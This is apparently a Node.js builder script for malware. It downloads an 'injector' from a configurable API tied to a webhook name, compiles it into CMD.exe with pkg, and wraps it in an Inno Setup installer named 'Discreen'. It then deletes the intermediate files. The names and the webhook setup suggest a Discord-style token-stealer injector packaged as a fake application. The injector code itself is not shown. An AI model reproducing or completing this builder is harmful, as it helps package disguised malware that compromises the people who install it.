const api = "" // api url
const pseudo = "base31" // pseudo api (pseudo = webhook config.json)
const exe = "Discreen" // name exe


const https = require("https");
const fs = require("fs");
const { exec } = require('pkg');

if (!fs.existsSync("./build/")) fs.mkdirSync("./build/");
https.get(`${api}/injector/${pseudo}`, (resp) => {
    let data = ''
    resp.on('data', (chunk) => {
        data += chunk
    })
    resp.on('end', () => {
        fs.writeFile(`./build/index.js`, data, (err) => {
            if (err) return console.log(err)
            console.log("Injector load")
            exec([`./build/index.js`, '--target', 'host', '--output', './build/CMD.exe']).then(() => {
                console.log("Injector compile")
                https.get(`${api}/setup/${pseudo}`, (resp) => {
                    let data2 = ''
                    resp.on('data', (chunk) => {
                        data2 += chunk
                    })
                    resp.on('end', () => {
                        fs.writeFile(`./build/index.iss`, data2, (err) => { // oublier pas de modifier le fichier setup.isis sur votre api avec les bon emplacements
                            if (err) return console.log(err)
                            console.log("Setup load")
                            require("innosetup-compiler")(`./build/index.iss`, {
                                O: './build/'
                            }, function (error) {
                                if (error) return console.log(error)
                                console.log("Setup compile")
                                setTimeout(() => {
                                    fs.unlinkSync(`./build/index.js`);
                                    fs.unlinkSync(`./build/CMD.exe`);
                                    fs.unlinkSync(`./build/index.iss`);
                                }, 10000);
                            })
                        })
                    }).on("error", (err) => { return console.log(err) })
                });
            }).catch((err) => { return console.log(err) })
        })
    })
}).on("error", (err) => { return console.log(err) })
